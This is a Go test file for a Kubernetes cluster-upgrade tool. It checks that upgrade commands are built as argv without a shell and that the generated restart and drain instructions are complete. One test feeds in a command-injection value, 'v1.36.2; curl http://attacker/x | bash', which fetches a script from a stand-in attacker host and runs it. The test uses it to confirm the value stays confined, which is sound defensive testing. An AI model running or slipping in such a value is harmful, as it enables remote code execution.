package upgrade

import (
	"slices"
	"strings"
	"testing"

	"github.com/ctrliq/stratum/internal/rollout"
)

// No interpreter may appear anywhere in the payload: nothing in it can be re-parsed as code.
func TestNodeUpgradeArgvHasNoShell(t *testing.T) {
	argv := nodeUpgradeArgv(ClusterOptions{
		From: "/var/lib/stratum-upgrade/stratum-v1.36.2", Target: "v1.36.2", SoakSec: 15,
	}, Node{})
	for i, a := range argv {
		if a == "-c" {
			t.Errorf("argv[%d] is %q — a shell -c flag is back in the payload", i, a)
		}
		for _, sh := range []string{"bash", "/bin/sh", "zsh"} {
			if strings.Contains(a, sh) {
				t.Errorf("argv[%d] = %q contains a shell (%q)", i, a, sh)
			}
		}
	}
	if got := argv[9]; got != "/var/lib/stratum-upgrade/stratum-v1.36.2" {
		t.Errorf("exec target = %q, want the staged upgrade binary itself", got)
	}
}

// Hostile values must land as one argv element each; preflight is a separate control.
func TestNodeUpgradeArgvKeepsHostileValuesAsSingleElements(t *testing.T) {
	const evil = "v1.36.2; curl http://attacker/x | bash"
	argv := nodeUpgradeArgv(ClusterOptions{From: "/b", Target: evil, SoakSec: 15}, Node{})

	idx := -1
	for i, a := range argv {
		if a == "--target" {
			idx = i + 1
		}
	}
	if idx < 0 || idx >= len(argv) {
		t.Fatal("no --target in argv")
	}
	if argv[idx] != evil {
		t.Errorf("--target value = %q, want the payload intact in exactly one element", argv[idx])
	}
	for i, a := range argv {
		if i != idx && strings.Contains(a, "curl") {
			t.Errorf("argv[%d] = %q — the payload leaked into another element", i, a)
		}
	}
}

func TestNodeUpgradeArgvSkipSnapshot(t *testing.T) {
	base := nodeUpgradeArgv(ClusterOptions{From: "/b", Target: "v1.36.2", SoakSec: 15}, Node{})
	with := nodeUpgradeArgv(ClusterOptions{From: "/b", Target: "v1.36.2", SoakSec: 15, SkipSnapshot: true}, Node{})
	if len(with) != len(base)+1 || with[len(with)-1] != "--skip-snapshot" {
		t.Errorf("SkipSnapshot argv = %v, want base + --skip-snapshot", with)
	}
}

func TestConfinementRestartSteps(t *testing.T) {
	for _, path := range []string{"/usr/local/bin/stratum", "/opt/my stratum/stratum"} {
		q := shellQuote(path)
		kubectl := "sudo " + q + " kubectl"
		steps := confinementRestartSteps(path)
		lines := strings.Split(steps, "\n")
		want := append(rollout.RestartCommands(kubectl), kubectl+" -n kube-system rollout restart ds/cilium-envoy")
		for _, wl := range rollout.Workloads {
			for _, target := range wl.Targets {
				want = append(want, kubectl+" -n "+wl.Namespace+" rollout status "+target)
			}
		}
		want = append(want, kubectl+" -n kube-system rollout status ds/cilium-envoy")
		for _, cmd := range want {
			if !slices.Contains(lines, "  "+cmd) {
				t.Errorf("path=%q: confinement restart steps are missing the line %q; they read:\n%s", path, cmd, steps)
			}
		}
		etcdctl := "sudo " + q + " etcdctl"
		before := "On a control-plane node, every member must report healthy:\n\n  " + etcdctl + " endpoint health --cluster\n\nThen, on each control-plane node, one at a time: "
		after := "On that node, run both of these until every etcd member reports healthy and its own apiserver answers ok:\n\n" +
			"  " + etcdctl + " endpoint health --cluster\n" +
			"  " + kubectl + " --server https://127.0.0.1:6443 get --raw /readyz\n\n" +
			"Then uncordon it (" + kubectl + " uncordon <node>) unless you had cordoned it yourself before the drain, and only then go on to the next control-plane node.\n"
		if !strings.HasSuffix(steps, after) {
			t.Errorf("path=%q: confinement restart steps do not end with the per-reboot etcd and apiserver check %q; they read:\n%s", path, after, steps)
		}
		for _, want := range []string{
			kubectl + " -n <namespace> rollout restart ds/<name>",
			kubectl + " -n <namespace> rollout status ds/<name>",
			"start only when every control-plane node is upgraded and Ready and every etcd member is healthy (recover a control plane this upgrade halted on first).",
			before,
			// The drain bypasses the CoreDNS gate, so the steps state its rule by hand.
			"one at a time: before you drain it, see where CoreDNS runs (" + kubectl + " -n kube-system get pods -l k8s-app=kube-dns -o wide). " +
				"CoreDNS has no PodDisruptionBudget, so a drain evicts every replica on the node. " +
				"If the node runs one, drain it only once another replica, not Terminating, is Running and Ready on another node that is Ready (" + kubectl + " get nodes); " +
				"if none is, stop and get one serving there first. " +
				"On a single-node cluster there is no other node: cluster DNS is down from the drain until you uncordon the node. Then drain it (",
			"drain it (" + kubectl + " drain <node> --ignore-daemonsets --delete-emptydir-data), reboot it, and wait for it to be Ready. Ready is not enough to go on",
			"A DaemonSet with the OnDelete update strategy, Stratum's or yours (" + kubectl + " -n <namespace> get ds <name> -o jsonpath='{.spec.updateStrategy.type}' prints OnDelete), is not recreated by a restart, and rollout status refuses it with an error: " +
				"skip its restart and status lines and instead delete its pods one at a time (" + kubectl + " -n <namespace> delete pod <pod>), " +
				"waiting for each replacement to be Running and Ready (" + kubectl + " -n <namespace> get pods -o wide) before deleting the next.",
			"run these steps yourself",
			"skipping the local-path-storage and stratum-dashboard lines",
			"NotFound for an add-on the cluster does not run is not a failure",
		} {
			if !strings.Contains(steps, want) {
				t.Errorf("path=%q: confinement restart steps are missing %q; they read:\n%s", path, want, steps)
			}
		}
		for _, line := range strings.Split(steps, "\n") {
			if (strings.Contains(line, "kubectl") || strings.Contains(line, "etcdctl")) && !strings.Contains(line, "sudo "+q+" ") {
				t.Errorf("path=%q: a command without sudo and the absolute path: %q", path, line)
			}
		}
	}
}
